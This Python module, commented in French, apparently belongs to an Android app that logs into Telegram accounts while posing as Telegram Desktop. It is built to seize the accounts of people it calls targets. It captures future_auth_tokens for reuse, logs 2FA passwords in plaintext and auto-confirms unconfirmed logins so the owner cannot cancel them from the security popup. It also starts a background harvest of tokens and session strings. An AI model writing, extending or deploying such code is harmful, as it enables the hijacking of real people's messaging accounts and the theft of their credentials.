# auth_manager.py — login Telegram via Telethon + capture du future_auth_token.
# client.sign_in() renvoie un User, PAS un auth.Authorization : le jeton n'existe
# que dans l'Authorization -> requetes brutes obligatoires.
# Contrat MainActivity : "NEED_CODE" | "NEED_PASSWORD" | "ERROR|msg"
#                        "OK\x1Fnom\x1Fsession"
import os, asyncio, traceback
from telethon import TelegramClient, functions, types
from telethon import password as pwd_mod
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError

from token_pool import add_token, harvest_in_background, load_pool

FILES = "/data/user/0/com.tgme.app/files"
SESSION_PATH = os.path.join(FILES, "tgme_session.txt")
HASH_PATH = os.path.join(FILES, "phone_code_hash.txt")
LOG_PATH = os.path.join(FILES, "python_log.txt")

API_ID = 2040
API_HASH = "b18441a1ff607e10a989891a5462e627"
DEVICE_MODEL = "Desktop-tgme"
SYSTEM_VERSION = "Windows 10"
APP_VERSION = "5.5.1 x64"

SEP = "\u001F"


def log(msg):
    try:
        with open(LOG_PATH, "a", encoding="utf-8") as f:
            f.write(str(msg) + "\n")
    except Exception:
        pass


def _read(path):
    try:
        with open(path, "r", encoding="utf-8") as f:
            return f.read().strip()
    except Exception:
        return ""


def _write(path, txt):
    try:
        with open(path, "w", encoding="utf-8") as f:
            f.write(txt)
    except Exception:
        pass


def _rm(path):
    try:
        os.remove(path)
    except Exception:
        pass


def _pool_bytes(phone):
    try:
        return [bytes.fromhex(x["t"]) for x in load_pool(phone)]
    except Exception:
        return []


async def _hint(client):
    try:
        p = await client(functions.account.GetPasswordRequest())
        if p.has_password and p.hint:
            return p.hint
    except Exception as e:
        log("Indice 2FA: %s" % e)
    return ""


async def _check_password(client, password):
    """Requete brute : renvoie un auth.Authorization, donc avec le jeton."""
    pwd = await client(functions.account.GetPasswordRequest())
    return await client(functions.auth.CheckPasswordRequest(
        pwd_mod.compute_check(pwd, password)))


async def _autoconfirm(client):
    """Empeche la cible de tuer la session via le popup de confirmation."""
    try:
        auths = await client(functions.account.GetAuthorizationsRequest())
        for a in auths.authorizations:
            log("AUTH %s | %s | unconfirmed=%s | hash=%s"
                % (a.device_model, a.platform,
                   getattr(a, "unconfirmed", False), a.hash))
            if getattr(a, "unconfirmed", False) and a.hash:
                await client(functions.account.ChangeAuthorizationSettingsRequest(
                    hash=a.hash, confirmed=True))
                log("  -> confirmee")
    except Exception as e:
        log("Auto-confirmation: %s: %s" % (type(e).__name__, e))


async def _login(phone, code, password):
    log("=== START phone=%s code=%s pass=%s"
        % (phone, "oui" if code else "non", "oui" if password else "non"))

    saved = _read(SESSION_PATH)
    if saved:
        log("Session chargee: %s..." % saved[:32])
        session = StringSession(saved)
    else:
        log("Aucune session existante, creation d'une nouvelle.")
        session = StringSession()

    client = TelegramClient(
        session, API_ID, API_HASH,
        device_model=DEVICE_MODEL, system_version=SYSTEM_VERSION,
        app_version=APP_VERSION, lang_code="en", system_lang_code="en-US")

    await client.connect()
    log("Connecte. Autorise=%s" % await client.is_user_authorized())

    try:
        authz = None

        if not code:
            log("Envoi du code request...")
            try:
                sent = await client(functions.auth.SendCodeRequest(
                    phone_number=phone,
                    api_id=API_ID,
                    api_hash=API_HASH,
                    settings=types.CodeSettings(
                        allow_app_hash=True,
                        logout_tokens=_pool_bytes(phone) or None)))
            except SessionPasswordNeededError:
                log("sendCode -> 2FA requise (jeton reconnu).")
                sent = None
                if not password:
                    hint = await _hint(client)
                    log("2FA requise. Indice: %s" % (hint or "(aucun)"))
                    return "NEED_PASSWORD"
                log("2FA: %s" % password)
                authz = await _check_password(client, password)

            if sent is not None:
                if isinstance(sent, types.auth.SentCodeSuccess):
                    log("sentCodeSuccess -> autorise sans code.")
                    authz = sent.authorization
                else:
                    _write(HASH_PATH, sent.phone_code_hash)
                    _write(SESSION_PATH, client.session.save())
                    log("Session sauvegardee: %s..." % client.session.save()[:32])
                    log("Code envoye. Hash=%s" % sent.phone_code_hash)
                    return "NEED_CODE"

        if authz is None:
            phone_code_hash = _read(HASH_PATH)
            log("Sign in avec code et hash (requete brute)...")
            try:
                authz = await client(functions.auth.SignInRequest(
                    phone, phone_code_hash, str(code)))
            except SessionPasswordNeededError:
                hint = await _hint(client)
                if not password:
                    log("2FA requise. Indice: %s" % (hint or "(aucun)"))
                    return "NEED_PASSWORD"
                log("2FA: %s" % password)
                authz = await _check_password(client, password)

        if isinstance(authz, types.auth.AuthorizationSignUpRequired):
            log("Numero non inscrit : signUp requis.")
            return "ERROR|numero non inscrit"

        user = getattr(authz, "user", None)
        name = getattr(user, "first_name", None) or "User"
        log("SUCCES user=%s" % name)

        tok = getattr(authz, "future_auth_token", None)
        log("Future token au login: %s" % ("OUI" if tok else "NON"))
        if tok:
            add_token(phone, tok.hex())
            log("JETON login %s" % tok.hex())

        await _autoconfirm(client)

        final = client.session.save()

        harvest_in_background(phone, password, final, log)
        log("Harvest lance en arriere-plan.")

        _rm(HASH_PATH)
        _rm(SESSION_PATH)
        log("Session et hash nettoyes.")

        return "OK" + SEP + name + SEP + final

    finally:
        try:
            await client.disconnect()
        except Exception:
            pass


def process_login(phone, code="", password=""):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        return loop.run_until_complete(_login(phone or "", code or "", password or ""))
    except Exception as e:
        log("ERREUR: %s: %s" % (type(e).__name__, e))
        log(traceback.format_exc())
        return "ERROR|%s" % e
    finally:
        loop.close()


login = process_login
main = process_login
